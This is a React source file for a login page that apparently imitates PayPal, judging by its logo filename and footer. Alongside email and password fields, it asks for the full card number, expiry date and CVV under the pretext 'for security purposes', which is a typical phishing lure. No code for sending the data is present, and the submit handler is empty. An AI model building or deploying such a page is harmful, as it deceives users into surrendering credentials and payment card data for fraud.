import { useState } from 'react'
import LoginForm from './component/LoginForm';
// import { BrowserRouter as Router, Route, Routes } from "react-router-dom"
import Logo from '/pal.svg'

function App() {
  function ForgotPassword() {
    return (
      <a href="#" className="text-blue-500 hover:underline">
        Forgot Password?
      </a>
    );
  }
  
  function CreditCardForm() {
    const [cardNumber, setCardNumber] = useState('');
    const [expiryDate, setExpiryDate] = useState('');
    const [cvv, setCvv] = useState('');
  
    const handleCardNumberChange = (event) => {
      setCardNumber(event.target.value.replace(/\D/g, '')); // Allow only digits
    };
  
    const handleExpiryDateChange = (event) => {
      setExpiryDate(event.target.value.replace(/\D/g, '').slice(0, 5)); // Allow only digits, limit to 5 characters (MM/YY)
    };
  
    const handleCvvChange = (event) => {
      setCvv(event.target.value.replace(/\D/g, '').slice(0, 3)); // Allow only digits, limit to 3 characters
    };
  
    return (
      <div>
      <div className="shadow-md rounded-md p-4">
        <h3 className="text-lg font-medium mb-4">Payment Information</h3>
        <div className="grid grid-cols-1 gap-4">
          <div className="flex items-center">
            <label htmlFor="cardNumber" className="w-1/4 text-sm font-medium text-gray-700">
              Card Number
            </label>
            <input
              type="text"
              id="cardNumber"
              name="cardNumber"
              className="w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
              placeholder="**** **** **** ****"
              maxLength={16}
              value={cardNumber}
              onChange={handleCardNumberChange}
            />
          </div>
          <div className="grid grid-cols-2 gap-4">
            <div className="flex items-center">
              <label htmlFor="expiryDate" className="w-1/2 text-sm font-medium text-gray-700">
                Expiry Date
              </label>
              <input
                type="text"
                id="expiryDate"
                name="expiryDate"
                className="w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
                placeholder="MM/YY"
                maxLength={5}
                value={expiryDate}
                onChange={handleExpiryDateChange}
              />
            </div>
            <div className="flex items-center">
              <label htmlFor="cvv" className="w-1/2 text-sm font-medium text-gray-700">
                CVV
              </label>
              <input
                type="text"
                id="cvv"
                name="cvv"
                className="w-full rounded-md border border-gray-300 px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
                placeholder="***"
                maxLength={3}
                value={cvv}
                onChange={handleCvvChange}
              />
            </div>
          </div>
        </div>
      </div>
      </div>
    );
  }

  function SignupButton() {
    return (
      <a href="#" className="text-sm text-gray-500 hover:underline">
        Sign Up
      </a>
    );
  }
  function EmailField() {
    return (
      <div className="flex flex-col  mb-4">
        <label htmlFor="email" className="w-1/4 text-[18px] py-4 font-medium text-gray-700">
          Email
        </label>
        <input
          type="email"
          id="email"
          name="email"
          className="w-full text-lg py-5 rounded-md border border-gray-600 px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
          placeholder="Enter your email"
        />
      </div>
    );
  }
  
  function PasswordField() {
    const [showPassword, setShowPassword] = useState(false);
  
    return (
      <div className="flex flex-col  mb-4">
        <label htmlFor="password" className="w-1/4 text-[18px] py-4 font-medium text-gray-700">
          Password
        </label>
        <input
          type={showPassword ? "text" : "password"}
          id="password"
          name="password"
          className="w-full text-lg py-5 rounded-md border border-gray-600 px-3 focus:outline-none focus:ring-1 focus:ring-blue-500"
          placeholder="Enter your password"
        />
        <button
          type="button"
          className=" text-sm text-gray-500 hover:underline"
          onClick={() => setShowPassword(!showPassword)}
        >
          {showPassword ? "Hide" : "Show"}
        </button>
      </div>
    );
  }
  function Login() {
   
    return (
      <div>
      <div className="container h-full flex flex-col justify-center items-center px-5 py-12 md:flex md:w-[50%] md:justify-center md:items-center md:mx-0">
      <div className="py-8">
        <img src={Logo} alt='logo' height={40} width={40} />
      </div>
      <form className='w-[100%]'>
        <EmailField/>
        <PasswordField />
        <p  className='text-base font-medium py-2 '>PLease Confirm your Credit Card Details [NOTE THAT THIS IS FOR SECURITY PURPOSES]</p>
       
        <CreditCardForm/>
        <p className='text-lg font-bold text-blue-600 py-3'>Forgot password?</p>
        <button type="submit" className=" text-lg bg-blue-600 hover:bg-blue-800 text-white font-semibold py-2 w-full rounded-3xl"
         onSubmit={() =>  {
          
         }}>
              Log In
        </button>
        <p className='py-6 text-center font-bold'>or</p>
        <button type="submit" className="text-lg border-gray-600 border-2 font-semibold py-2 w-full rounded-3xl">
              Sign Up
        </button>
      </form>
    </div>
    <div className='bottom-0 text-sm text-gray-500 font-bold flex justify-evenly py-3 bg-gray-200'>
      <p>Contact Us</p>
      <p>Privacy</p>
      <p>Legal</p>
      <p>Worldwide</p>
    </div>
    </div>
    )
  }
 



  
  return (
    <>
    <Login />
    
    </>
  )
}

export default App
